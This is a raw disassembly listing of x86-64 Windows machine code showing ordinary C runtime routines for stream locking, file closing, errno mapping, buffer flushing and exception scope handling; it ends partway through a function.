   14000424d:	80 3d f8 6e 01 00 00 	cmpb   $0x0,0x16ef8(%rip)        # 0x14001b14c
   140004254:	74 05                	je     0x14000425b
   140004256:	e8 49 3f 00 00       	call   0x1400081a4
   14000425b:	48 8b 0d 0e 7a 01 00 	mov    0x17a0e(%rip),%rcx        # 0x14001bc70
   140004262:	e8 2d f5 ff ff       	call   0x140003794
   140004267:	48 83 25 01 7a 01 00 	andq   $0x0,0x17a01(%rip)        # 0x14001bc70
   14000426e:	00 
   14000426f:	48 83 c4 28          	add    $0x28,%rsp
   140004273:	c3                   	ret
   140004274:	48 8d 05 a5 4d 01 00 	lea    0x14da5(%rip),%rax        # 0x140019020
   14000427b:	c3                   	ret
   14000427c:	40 53                	rex push %rbx
   14000427e:	48 83 ec 20          	sub    $0x20,%rsp
   140004282:	48 8b d9             	mov    %rcx,%rbx
   140004285:	48 8d 0d 94 4d 01 00 	lea    0x14d94(%rip),%rcx        # 0x140019020
   14000428c:	48 3b d9             	cmp    %rcx,%rbx
   14000428f:	72 40                	jb     0x1400042d1
   140004291:	48 8d 05 18 51 01 00 	lea    0x15118(%rip),%rax        # 0x1400193b0
   140004298:	48 3b d8             	cmp    %rax,%rbx
   14000429b:	77 34                	ja     0x1400042d1
   14000429d:	48 8b d3             	mov    %rbx,%rdx
   1400042a0:	48 b8 ab aa aa aa aa 	movabs $0x2aaaaaaaaaaaaaab,%rax
   1400042a7:	aa aa 2a 
   1400042aa:	48 2b d1             	sub    %rcx,%rdx
   1400042ad:	48 f7 ea             	imul   %rdx
   1400042b0:	48 c1 fa 03          	sar    $0x3,%rdx
   1400042b4:	48 8b ca             	mov    %rdx,%rcx
   1400042b7:	48 c1 e9 3f          	shr    $0x3f,%rcx
   1400042bb:	48 03 ca             	add    %rdx,%rcx
   1400042be:	83 c1 10             	add    $0x10,%ecx
   1400042c1:	e8 ea 3b 00 00       	call   0x140007eb0
   1400042c6:	0f ba 6b 18 0f       	btsl   $0xf,0x18(%rbx)
   1400042cb:	48 83 c4 20          	add    $0x20,%rsp
   1400042cf:	5b                   	pop    %rbx
   1400042d0:	c3                   	ret
   1400042d1:	48 8d 4b 30          	lea    0x30(%rbx),%rcx
   1400042d5:	48 83 c4 20          	add    $0x20,%rsp
   1400042d9:	5b                   	pop    %rbx
   1400042da:	48 ff 25 67 ce 00 00 	rex.W jmp *0xce67(%rip)        # 0x140011148
   1400042e1:	cc                   	int3
   1400042e2:	cc                   	int3
   1400042e3:	cc                   	int3
   1400042e4:	40 53                	rex push %rbx
   1400042e6:	48 83 ec 20          	sub    $0x20,%rsp
   1400042ea:	48 8b da             	mov    %rdx,%rbx
   1400042ed:	83 f9 14             	cmp    $0x14,%ecx
   1400042f0:	7d 13                	jge    0x140004305
   1400042f2:	83 c1 10             	add    $0x10,%ecx
   1400042f5:	e8 b6 3b 00 00       	call   0x140007eb0
   1400042fa:	0f ba 6b 18 0f       	btsl   $0xf,0x18(%rbx)
   1400042ff:	48 83 c4 20          	add    $0x20,%rsp
   140004303:	5b                   	pop    %rbx
   140004304:	c3                   	ret
   140004305:	48 8d 4a 30          	lea    0x30(%rdx),%rcx
   140004309:	48 83 c4 20          	add    $0x20,%rsp
   14000430d:	5b                   	pop    %rbx
   14000430e:	48 ff 25 33 ce 00 00 	rex.W jmp *0xce33(%rip)        # 0x140011148
   140004315:	cc                   	int3
   140004316:	cc                   	int3
   140004317:	cc                   	int3
   140004318:	48 8d 15 01 4d 01 00 	lea    0x14d01(%rip),%rdx        # 0x140019020
   14000431f:	48 3b ca             	cmp    %rdx,%rcx
   140004322:	72 37                	jb     0x14000435b
   140004324:	48 8d 05 85 50 01 00 	lea    0x15085(%rip),%rax        # 0x1400193b0
   14000432b:	48 3b c8             	cmp    %rax,%rcx
   14000432e:	77 2b                	ja     0x14000435b
   140004330:	0f ba 71 18 0f       	btrl   $0xf,0x18(%rcx)
   140004335:	48 2b ca             	sub    %rdx,%rcx
   140004338:	48 b8 ab aa aa aa aa 	movabs $0x2aaaaaaaaaaaaaab,%rax
   14000433f:	aa aa 2a 
   140004342:	48 f7 e9             	imul   %rcx
   140004345:	48 c1 fa 03          	sar    $0x3,%rdx
   140004349:	48 8b ca             	mov    %rdx,%rcx
   14000434c:	48 c1 e9 3f          	shr    $0x3f,%rcx
   140004350:	48 03 ca             	add    %rdx,%rcx
   140004353:	83 c1 10             	add    $0x10,%ecx
   140004356:	e9 45 3d 00 00       	jmp    0x1400080a0
   14000435b:	48 83 c1 30          	add    $0x30,%rcx
   14000435f:	48 ff 25 ea cd 00 00 	rex.W jmp *0xcdea(%rip)        # 0x140011150
   140004366:	cc                   	int3
   140004367:	cc                   	int3
   140004368:	83 f9 14             	cmp    $0x14,%ecx
   14000436b:	7d 0d                	jge    0x14000437a
   14000436d:	0f ba 72 18 0f       	btrl   $0xf,0x18(%rdx)
   140004372:	83 c1 10             	add    $0x10,%ecx
   140004375:	e9 26 3d 00 00       	jmp    0x1400080a0
   14000437a:	48 8d 4a 30          	lea    0x30(%rdx),%rcx
   14000437e:	48 ff 25 cb cd 00 00 	rex.W jmp *0xcdcb(%rip)        # 0x140011150
   140004385:	cc                   	int3
   140004386:	cc                   	int3
   140004387:	cc                   	int3
   140004388:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000438d:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140004391:	56                   	push   %rsi
   140004392:	57                   	push   %rdi
   140004393:	41 56                	push   %r14
   140004395:	48 83 ec 20          	sub    $0x20,%rsp
   140004399:	48 63 d9             	movslq %ecx,%rbx
   14000439c:	83 fb fe             	cmp    $0xfffffffe,%ebx
   14000439f:	75 18                	jne    0x1400043b9
   1400043a1:	e8 62 01 00 00       	call   0x140004508
   1400043a6:	83 20 00             	andl   $0x0,(%rax)
   1400043a9:	e8 ca 01 00 00       	call   0x140004578
   1400043ae:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   1400043b4:	e9 81 00 00 00       	jmp    0x14000443a
   1400043b9:	85 c9                	test   %ecx,%ecx
   1400043bb:	78 65                	js     0x140004422
   1400043bd:	3b 1d 9d 78 01 00    	cmp    0x1789d(%rip),%ebx        # 0x14001bc60
   1400043c3:	73 5d                	jae    0x140004422
   1400043c5:	48 8b c3             	mov    %rbx,%rax
   1400043c8:	48 8b fb             	mov    %rbx,%rdi
   1400043cb:	48 c1 ff 05          	sar    $0x5,%rdi
   1400043cf:	4c 8d 35 3a 6b 01 00 	lea    0x16b3a(%rip),%r14        # 0x14001af10
   1400043d6:	83 e0 1f             	and    $0x1f,%eax
   1400043d9:	48 6b f0 58          	imul   $0x58,%rax,%rsi
   1400043dd:	49 8b 04 fe          	mov    (%r14,%rdi,8),%rax
   1400043e1:	0f be 4c 30 08       	movsbl 0x8(%rax,%rsi,1),%ecx
   1400043e6:	83 e1 01             	and    $0x1,%ecx
   1400043e9:	74 37                	je     0x140004422
   1400043eb:	8b cb                	mov    %ebx,%ecx
   1400043ed:	e8 5a 3e 00 00       	call   0x14000824c
   1400043f2:	90                   	nop
   1400043f3:	49 8b 04 fe          	mov    (%r14,%rdi,8),%rax
   1400043f7:	f6 44 30 08 01       	testb  $0x1,0x8(%rax,%rsi,1)
   1400043fc:	74 0b                	je     0x140004409
   1400043fe:	8b cb                	mov    %ebx,%ecx
   140004400:	e8 47 00 00 00       	call   0x14000444c
   140004405:	8b f8                	mov    %eax,%edi
   140004407:	eb 0e                	jmp    0x140004417
   140004409:	e8 6a 01 00 00       	call   0x140004578
   14000440e:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140004414:	83 cf ff             	or     $0xffffffff,%edi
   140004417:	8b cb                	mov    %ebx,%ecx
   140004419:	e8 8e 42 00 00       	call   0x1400086ac
   14000441e:	8b c7                	mov    %edi,%eax
   140004420:	eb 1b                	jmp    0x14000443d
   140004422:	e8 e1 00 00 00       	call   0x140004508
   140004427:	83 20 00             	andl   $0x0,(%rax)
   14000442a:	e8 49 01 00 00       	call   0x140004578
   14000442f:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140004435:	e8 ee fc ff ff       	call   0x140004128
   14000443a:	83 c8 ff             	or     $0xffffffff,%eax
   14000443d:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140004442:	48 83 c4 20          	add    $0x20,%rsp
   140004446:	41 5e                	pop    %r14
   140004448:	5f                   	pop    %rdi
   140004449:	5e                   	pop    %rsi
   14000444a:	c3                   	ret
   14000444b:	cc                   	int3
   14000444c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004451:	57                   	push   %rdi
   140004452:	48 83 ec 20          	sub    $0x20,%rsp
   140004456:	48 63 f9             	movslq %ecx,%rdi
   140004459:	8b cf                	mov    %edi,%ecx
   14000445b:	e8 28 41 00 00       	call   0x140008588
   140004460:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140004464:	74 59                	je     0x1400044bf
   140004466:	48 8b 05 a3 6a 01 00 	mov    0x16aa3(%rip),%rax        # 0x14001af10
   14000446d:	b9 02 00 00 00       	mov    $0x2,%ecx
   140004472:	83 ff 01             	cmp    $0x1,%edi
   140004475:	75 09                	jne    0x140004480
   140004477:	40 84 b8 b8 00 00 00 	test   %dil,0xb8(%rax)
   14000447e:	75 0a                	jne    0x14000448a
   140004480:	3b f9                	cmp    %ecx,%edi
   140004482:	75 1d                	jne    0x1400044a1
   140004484:	f6 40 60 01          	testb  $0x1,0x60(%rax)
   140004488:	74 17                	je     0x1400044a1
   14000448a:	e8 f9 40 00 00       	call   0x140008588
   14000448f:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004494:	48 8b d8             	mov    %rax,%rbx
   140004497:	e8 ec 40 00 00       	call   0x140008588
   14000449c:	48 3b c3             	cmp    %rbx,%rax
   14000449f:	74 1e                	je     0x1400044bf
   1400044a1:	8b cf                	mov    %edi,%ecx
   1400044a3:	e8 e0 40 00 00       	call   0x140008588
   1400044a8:	48 8b c8             	mov    %rax,%rcx
   1400044ab:	ff 15 4f cb 00 00    	call   *0xcb4f(%rip)        # 0x140011000
   1400044b1:	85 c0                	test   %eax,%eax
   1400044b3:	75 0a                	jne    0x1400044bf
   1400044b5:	ff 15 d5 cb 00 00    	call   *0xcbd5(%rip)        # 0x140011090
   1400044bb:	8b d8                	mov    %eax,%ebx
   1400044bd:	eb 02                	jmp    0x1400044c1
   1400044bf:	33 db                	xor    %ebx,%ebx
   1400044c1:	8b cf                	mov    %edi,%ecx
   1400044c3:	e8 14 40 00 00       	call   0x1400084dc
   1400044c8:	48 8b d7             	mov    %rdi,%rdx
   1400044cb:	48 8b cf             	mov    %rdi,%rcx
   1400044ce:	48 c1 f9 05          	sar    $0x5,%rcx
   1400044d2:	83 e2 1f             	and    $0x1f,%edx
   1400044d5:	4c 8d 05 34 6a 01 00 	lea    0x16a34(%rip),%r8        # 0x14001af10
   1400044dc:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   1400044e0:	48 6b d2 58          	imul   $0x58,%rdx,%rdx
   1400044e4:	c6 44 11 08 00       	movb   $0x0,0x8(%rcx,%rdx,1)
   1400044e9:	85 db                	test   %ebx,%ebx
   1400044eb:	74 0c                	je     0x1400044f9
   1400044ed:	8b cb                	mov    %ebx,%ecx
   1400044ef:	e8 34 00 00 00       	call   0x140004528
   1400044f4:	83 c8 ff             	or     $0xffffffff,%eax
   1400044f7:	eb 02                	jmp    0x1400044fb
   1400044f9:	33 c0                	xor    %eax,%eax
   1400044fb:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004500:	48 83 c4 20          	add    $0x20,%rsp
   140004504:	5f                   	pop    %rdi
   140004505:	c3                   	ret
   140004506:	cc                   	int3
   140004507:	cc                   	int3
   140004508:	48 83 ec 28          	sub    $0x28,%rsp
   14000450c:	e8 cb 26 00 00       	call   0x140006bdc
   140004511:	48 85 c0             	test   %rax,%rax
   140004514:	75 09                	jne    0x14000451f
   140004516:	48 8d 05 2f 50 01 00 	lea    0x1502f(%rip),%rax        # 0x14001954c
   14000451d:	eb 04                	jmp    0x140004523
   14000451f:	48 83 c0 14          	add    $0x14,%rax
   140004523:	48 83 c4 28          	add    $0x28,%rsp
   140004527:	c3                   	ret
   140004528:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000452d:	57                   	push   %rdi
   14000452e:	48 83 ec 20          	sub    $0x20,%rsp
   140004532:	8b f9                	mov    %ecx,%edi
   140004534:	e8 a3 26 00 00       	call   0x140006bdc
   140004539:	48 85 c0             	test   %rax,%rax
   14000453c:	75 09                	jne    0x140004547
   14000453e:	48 8d 05 07 50 01 00 	lea    0x15007(%rip),%rax        # 0x14001954c
   140004545:	eb 04                	jmp    0x14000454b
   140004547:	48 83 c0 14          	add    $0x14,%rax
   14000454b:	89 38                	mov    %edi,(%rax)
   14000454d:	e8 8a 26 00 00       	call   0x140006bdc
   140004552:	48 8d 1d ef 4f 01 00 	lea    0x14fef(%rip),%rbx        # 0x140019548
   140004559:	48 85 c0             	test   %rax,%rax
   14000455c:	74 04                	je     0x140004562
   14000455e:	48 8d 58 10          	lea    0x10(%rax),%rbx
   140004562:	8b cf                	mov    %edi,%ecx
   140004564:	e8 2f 00 00 00       	call   0x140004598
   140004569:	89 03                	mov    %eax,(%rbx)
   14000456b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004570:	48 83 c4 20          	add    $0x20,%rsp
   140004574:	5f                   	pop    %rdi
   140004575:	c3                   	ret
   140004576:	cc                   	int3
   140004577:	cc                   	int3
   140004578:	48 83 ec 28          	sub    $0x28,%rsp
   14000457c:	e8 5b 26 00 00       	call   0x140006bdc
   140004581:	48 85 c0             	test   %rax,%rax
   140004584:	75 09                	jne    0x14000458f
   140004586:	48 8d 05 bb 4f 01 00 	lea    0x14fbb(%rip),%rax        # 0x140019548
   14000458d:	eb 04                	jmp    0x140004593
   14000458f:	48 83 c0 10          	add    $0x10,%rax
   140004593:	48 83 c4 28          	add    $0x28,%rsp
   140004597:	c3                   	ret
   140004598:	4c 8d 15 41 4e 01 00 	lea    0x14e41(%rip),%r10        # 0x1400193e0
   14000459f:	33 d2                	xor    %edx,%edx
   1400045a1:	4d 8b c2             	mov    %r10,%r8
   1400045a4:	44 8d 4a 08          	lea    0x8(%rdx),%r9d
   1400045a8:	41 3b 08             	cmp    (%r8),%ecx
   1400045ab:	74 2f                	je     0x1400045dc
   1400045ad:	ff c2                	inc    %edx
   1400045af:	4d 03 c1             	add    %r9,%r8
   1400045b2:	48 63 c2             	movslq %edx,%rax
   1400045b5:	48 83 f8 2d          	cmp    $0x2d,%rax
   1400045b9:	72 ed                	jb     0x1400045a8
   1400045bb:	8d 41 ed             	lea    -0x13(%rcx),%eax
   1400045be:	83 f8 11             	cmp    $0x11,%eax
   1400045c1:	77 06                	ja     0x1400045c9
   1400045c3:	b8 0d 00 00 00       	mov    $0xd,%eax
   1400045c8:	c3                   	ret
   1400045c9:	81 c1 44 ff ff ff    	add    $0xffffff44,%ecx
   1400045cf:	b8 16 00 00 00       	mov    $0x16,%eax
   1400045d4:	83 f9 0e             	cmp    $0xe,%ecx
   1400045d7:	41 0f 46 c1          	cmovbe %r9d,%eax
   1400045db:	c3                   	ret
   1400045dc:	48 63 c2             	movslq %edx,%rax
   1400045df:	41 8b 44 c2 04       	mov    0x4(%r10,%rax,8),%eax
   1400045e4:	c3                   	ret
   1400045e5:	cc                   	int3
   1400045e6:	cc                   	int3
   1400045e7:	cc                   	int3
   1400045e8:	40 53                	rex push %rbx
   1400045ea:	48 83 ec 20          	sub    $0x20,%rsp
   1400045ee:	f6 41 18 83          	testb  $0x83,0x18(%rcx)
   1400045f2:	48 8b d9             	mov    %rcx,%rbx
   1400045f5:	74 22                	je     0x140004619
   1400045f7:	f6 41 18 08          	testb  $0x8,0x18(%rcx)
   1400045fb:	74 1c                	je     0x140004619
   1400045fd:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   140004601:	e8 8e f1 ff ff       	call   0x140003794
   140004606:	81 63 18 f7 fb ff ff 	andl   $0xfffffbf7,0x18(%rbx)
   14000460d:	33 c0                	xor    %eax,%eax
   14000460f:	48 89 03             	mov    %rax,(%rbx)
   140004612:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140004616:	89 43 08             	mov    %eax,0x8(%rbx)
   140004619:	48 83 c4 20          	add    $0x20,%rsp
   14000461d:	5b                   	pop    %rbx
   14000461e:	c3                   	ret
   14000461f:	cc                   	int3
   140004620:	40 53                	rex push %rbx
   140004622:	48 83 ec 20          	sub    $0x20,%rsp
   140004626:	48 8b d9             	mov    %rcx,%rbx
   140004629:	48 85 c9             	test   %rcx,%rcx
   14000462c:	75 0a                	jne    0x140004638
   14000462e:	48 83 c4 20          	add    $0x20,%rsp
   140004632:	5b                   	pop    %rbx
   140004633:	e9 bc 00 00 00       	jmp    0x1400046f4
   140004638:	e8 2f 00 00 00       	call   0x14000466c
   14000463d:	85 c0                	test   %eax,%eax
   14000463f:	74 05                	je     0x140004646
   140004641:	83 c8 ff             	or     $0xffffffff,%eax
   140004644:	eb 20                	jmp    0x140004666
   140004646:	f7 43 18 00 40 00 00 	testl  $0x4000,0x18(%rbx)
   14000464d:	74 15                	je     0x140004664
   14000464f:	48 8b cb             	mov    %rbx,%rcx
   140004652:	e8 2d fb ff ff       	call   0x140004184
   140004657:	8b c8                	mov    %eax,%ecx
   140004659:	e8 7a 40 00 00       	call   0x1400086d8
   14000465e:	f7 d8                	neg    %eax
   140004660:	1b c0                	sbb    %eax,%eax
   140004662:	eb 02                	jmp    0x140004666
   140004664:	33 c0                	xor    %eax,%eax
   140004666:	48 83 c4 20          	add    $0x20,%rsp
   14000466a:	5b                   	pop    %rbx
   14000466b:	c3                   	ret
   14000466c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004671:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140004676:	57                   	push   %rdi
   140004677:	48 83 ec 20          	sub    $0x20,%rsp
   14000467b:	8b 41 18             	mov    0x18(%rcx),%eax
   14000467e:	33 f6                	xor    %esi,%esi
   140004680:	48 8b d9             	mov    %rcx,%rbx
   140004683:	24 03                	and    $0x3,%al
   140004685:	3c 02                	cmp    $0x2,%al
   140004687:	75 3f                	jne    0x1400046c8
   140004689:	f7 41 18 08 01 00 00 	testl  $0x108,0x18(%rcx)
   140004690:	74 36                	je     0x1400046c8
   140004692:	8b 39                	mov    (%rcx),%edi
   140004694:	2b 79 10             	sub    0x10(%rcx),%edi
   140004697:	85 ff                	test   %edi,%edi
   140004699:	7e 2d                	jle    0x1400046c8
   14000469b:	e8 e4 fa ff ff       	call   0x140004184
   1400046a0:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   1400046a4:	44 8b c7             	mov    %edi,%r8d
   1400046a7:	8b c8                	mov    %eax,%ecx
   1400046a9:	e8 32 19 00 00       	call   0x140005fe0
   1400046ae:	3b c7                	cmp    %edi,%eax
   1400046b0:	75 0f                	jne    0x1400046c1
   1400046b2:	8b 43 18             	mov    0x18(%rbx),%eax
   1400046b5:	84 c0                	test   %al,%al
   1400046b7:	79 0f                	jns    0x1400046c8
   1400046b9:	83 e0 fd             	and    $0xfffffffd,%eax
   1400046bc:	89 43 18             	mov    %eax,0x18(%rbx)
   1400046bf:	eb 07                	jmp    0x1400046c8
   1400046c1:	83 4b 18 20          	orl    $0x20,0x18(%rbx)
   1400046c5:	83 ce ff             	or     $0xffffffff,%esi
   1400046c8:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   1400046cc:	83 63 08 00          	andl   $0x0,0x8(%rbx)
   1400046d0:	8b c6                	mov    %esi,%eax
   1400046d2:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400046d7:	48 89 0b             	mov    %rcx,(%rbx)
   1400046da:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400046df:	48 83 c4 20          	add    $0x20,%rsp
   1400046e3:	5f                   	pop    %rdi
   1400046e4:	c3                   	ret
   1400046e5:	cc                   	int3
   1400046e6:	cc                   	int3
   1400046e7:	cc                   	int3
   1400046e8:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400046ed:	e9 02 00 00 00       	jmp    0x1400046f4
   1400046f2:	cc                   	int3
   1400046f3:	cc                   	int3
   1400046f4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400046f9:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400046fe:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140004703:	41 55                	push   %r13
   140004705:	41 56                	push   %r14
   140004707:	41 57                	push   %r15
   140004709:	48 83 ec 30          	sub    $0x30,%rsp
   14000470d:	44 8b f1             	mov    %ecx,%r14d
   140004710:	33 f6                	xor    %esi,%esi
   140004712:	33 ff                	xor    %edi,%edi
   140004714:	8d 4e 01             	lea    0x1(%rsi),%ecx
   140004717:	e8 94 37 00 00       	call   0x140007eb0
   14000471c:	90                   	nop
   14000471d:	33 db                	xor    %ebx,%ebx
   14000471f:	41 83 cd ff          	or     $0xffffffff,%r13d
   140004723:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140004727:	3b 1d 4b 75 01 00    	cmp    0x1754b(%rip),%ebx        # 0x14001bc78
   14000472d:	7d 7e                	jge    0x1400047ad
   14000472f:	4c 63 fb             	movslq %ebx,%r15
   140004732:	48 8b 05 37 75 01 00 	mov    0x17537(%rip),%rax        # 0x14001bc70
   140004739:	4a 8b 14 f8          	mov    (%rax,%r15,8),%rdx
   14000473d:	48 85 d2             	test   %rdx,%rdx
   140004740:	74 64                	je     0x1400047a6
   140004742:	f6 42 18 83          	testb  $0x83,0x18(%rdx)
   140004746:	74 5e                	je     0x1400047a6
   140004748:	8b cb                	mov    %ebx,%ecx
   14000474a:	e8 95 fb ff ff       	call   0x1400042e4
   14000474f:	90                   	nop
   140004750:	48 8b 05 19 75 01 00 	mov    0x17519(%rip),%rax        # 0x14001bc70
   140004757:	4a 8b 0c f8          	mov    (%rax,%r15,8),%rcx
   14000475b:	f6 41 18 83          	testb  $0x83,0x18(%rcx)
   14000475f:	74 33                	je     0x140004794
   140004761:	41 83 fe 01          	cmp    $0x1,%r14d
   140004765:	75 12                	jne    0x140004779
   140004767:	e8 b4 fe ff ff       	call   0x140004620
   14000476c:	41 3b c5             	cmp    %r13d,%eax
   14000476f:	74 23                	je     0x140004794
   140004771:	ff c6                	inc    %esi
   140004773:	89 74 24 24          	mov    %esi,0x24(%rsp)
   140004777:	eb 1b                	jmp    0x140004794
   140004779:	45 85 f6             	test   %r14d,%r14d
   14000477c:	75 16                	jne    0x140004794
   14000477e:	f6 41 18 02          	testb  $0x2,0x18(%rcx)
   140004782:	74 10                	je     0x140004794
   140004784:	e8 97 fe ff ff       	call   0x140004620
   140004789:	41 3b c5             	cmp    %r13d,%eax
   14000478c:	41 0f 44 fd          	cmove  %r13d,%edi
   140004790:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   140004794:	48 8b 15 d5 74 01 00 	mov    0x174d5(%rip),%rdx        # 0x14001bc70
   14000479b:	4a 8b 14 fa          	mov    (%rdx,%r15,8),%rdx
   14000479f:	8b cb                	mov    %ebx,%ecx
   1400047a1:	e8 c2 fb ff ff       	call   0x140004368
   1400047a6:	ff c3                	inc    %ebx
   1400047a8:	e9 76 ff ff ff       	jmp    0x140004723
   1400047ad:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400047b2:	e8 e9 38 00 00       	call   0x1400080a0
   1400047b7:	41 83 fe 01          	cmp    $0x1,%r14d
   1400047bb:	0f 44 fe             	cmove  %esi,%edi
   1400047be:	8b c7                	mov    %edi,%eax
   1400047c0:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400047c5:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1400047ca:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   1400047cf:	48 83 c4 30          	add    $0x30,%rsp
   1400047d3:	41 5f                	pop    %r15
   1400047d5:	41 5e                	pop    %r14
   1400047d7:	41 5d                	pop    %r13
   1400047d9:	c3                   	ret
   1400047da:	cc                   	int3
   1400047db:	cc                   	int3
   1400047dc:	48 8b c4             	mov    %rsp,%rax
   1400047df:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400047e3:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1400047e7:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1400047eb:	57                   	push   %rdi
   1400047ec:	41 54                	push   %r12
   1400047ee:	41 55                	push   %r13
   1400047f0:	41 56                	push   %r14
   1400047f2:	41 57                	push   %r15
   1400047f4:	48 83 ec 40          	sub    $0x40,%rsp
   1400047f8:	4d 8b 61 08          	mov    0x8(%r9),%r12
   1400047fc:	4d 8b 39             	mov    (%r9),%r15
   1400047ff:	49 8b 59 38          	mov    0x38(%r9),%rbx
   140004803:	4d 2b fc             	sub    %r12,%r15
   140004806:	f6 41 04 66          	testb  $0x66,0x4(%rcx)
   14000480a:	4d 8b f1             	mov    %r9,%r14
   14000480d:	4c 8b ea             	mov    %rdx,%r13
   140004810:	48 8b e9             	mov    %rcx,%rbp
   140004813:	0f 85 de 00 00 00    	jne    0x1400048f7
   140004819:	41 8b 71 48          	mov    0x48(%r9),%esi
   14000481d:	48 89 48 c8          	mov    %rcx,-0x38(%rax)
   140004821:	4c 89 40 d0          	mov    %r8,-0x30(%rax)
   140004825:	3b 33                	cmp    (%rbx),%esi
   140004827:	0f 83 6d 01 00 00    	jae    0x14000499a
   14000482d:	8b fe                	mov    %esi,%edi
   14000482f:	48 03 ff             	add    %rdi,%rdi
   140004832:	8b 44 fb 04          	mov    0x4(%rbx,%rdi,8),%eax
   140004836:	4c 3b f8             	cmp    %rax,%r15
   140004839:	0f 82 aa 00 00 00    	jb     0x1400048e9
   14000483f:	8b 44 fb 08          	mov    0x8(%rbx,%rdi,8),%eax
   140004843:	4c 3b f8             	cmp    %rax,%r15
   140004846:	0f 83 9d 00 00 00    	jae    0x1400048e9
   14000484c:	83 7c fb 10 00       	cmpl   $0x0,0x10(%rbx,%rdi,8)
   140004851:	0f 84 92 00 00 00    	je     0x1400048e9
   140004857:	83 7c fb 0c 01       	cmpl   $0x1,0xc(%rbx,%rdi,8)
   14000485c:	74 17                	je     0x140004875
   14000485e:	8b 44 fb 0c          	mov    0xc(%rbx,%rdi,8),%eax
   140004862:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004867:	49 8b d5             	mov    %r13,%rdx
   14000486a:	49 03 c4             	add    %r12,%rax
   14000486d:	ff d0                	call   *%rax
   14000486f:	85 c0                	test   %eax,%eax
   140004871:	78 7d                	js     0x1400048f0
   140004873:	7e 74                	jle    0x1400048e9
   140004875:	81 7d 00 63 73 6d e0 	cmpl   $0xe06d7363,0x0(%rbp)
   14000487c:	75 28                	jne    0x1400048a6
   14000487e:	48 83 3d e2 73 01 00 	cmpq   $0x0,0x173e2(%rip)        # 0x14001bc68
   140004885:	00 
   140004886:	74 1e                	je     0x1400048a6
   140004888:	48 8d 0d d9 73 01 00 	lea    0x173d9(%rip),%rcx        # 0x14001bc68
   14000488f:	e8 6c 3f 00 00       	call   0x140008800
   140004894:	85 c0                	test   %eax,%eax
   140004896:	74 0e                	je     0x1400048a6
   140004898:	ba 01 00 00 00       	mov    $0x1,%edx
   14000489d:	48 8b cd             	mov    %rbp,%rcx
   1400048a0:	ff 15 c2 73 01 00    	call   *0x173c2(%rip)        # 0x14001bc68
   1400048a6:	8b 4c fb 10          	mov    0x10(%rbx,%rdi,8),%ecx
   1400048aa:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400048b0:	49 8b d5             	mov    %r13,%rdx
   1400048b3:	49 03 cc             	add    %r12,%rcx
   1400048b6:	e8 45 05 00 00       	call   0x140004e00
   1400048bb:	49 8b 46 40          	mov    0x40(%r14),%rax
   1400048bf:	8b 54 fb 10          	mov    0x10(%rbx,%rdi,8),%edx
   1400048c3:	44 8b 4d 00          	mov    0x0(%rbp),%r9d
   1400048c7:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400048cc:	49 8b 46 28          	mov    0x28(%r14),%rax
   1400048d0:	49 03 d4             	add    %r12,%rdx
   1400048d3:	4c 8b c5             	mov    %rbp,%r8
   1400048d6:	49 8b cd             	mov    %r13,%rcx
   1400048d9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400048de:	ff 15 74 c8 00 00    	call   *0xc874(%rip)        # 0x140011158
   1400048e4:	e8 47 05 00 00       	call   0x140004e30
   1400048e9:	ff c6                	inc    %esi
   1400048eb:	e9 35 ff ff ff       	jmp    0x140004825
   1400048f0:	33 c0                	xor    %eax,%eax
   1400048f2:	e9 a8 00 00 00       	jmp    0x14000499f
   1400048f7:	49 8b 71 20          	mov    0x20(%r9),%rsi
   1400048fb:	41 8b 79 48          	mov    0x48(%r9),%edi
   1400048ff:	49 2b f4             	sub    %r12,%rsi
   140004902:	e9 89 00 00 00       	jmp    0x140004990
   140004907:	8b cf                	mov    %edi,%ecx
   140004909:	48 03 c9             	add    %rcx,%rcx
   14000490c:	8b 44 cb 04          	mov    0x4(%rbx,%rcx,8),%eax
   140004910:	4c 3b f8             	cmp    %rax,%r15
   140004913:	72 79                	jb     0x14000498e
   140004915:	8b 44 cb 08          	mov    0x8(%rbx,%rcx,8),%eax
   140004919:	4c 3b f8             	cmp    %rax,%r15
   14000491c:	73 70                	jae    0x14000498e
   14000491e:	f6 45 04 20          	testb  $0x20,0x4(%rbp)
   140004922:	74 44                	je     0x140004968
   140004924:	45 33 c9             	xor    %r9d,%r9d
   140004927:	85 d2                	test   %edx,%edx
   140004929:	74 38                	je     0x140004963
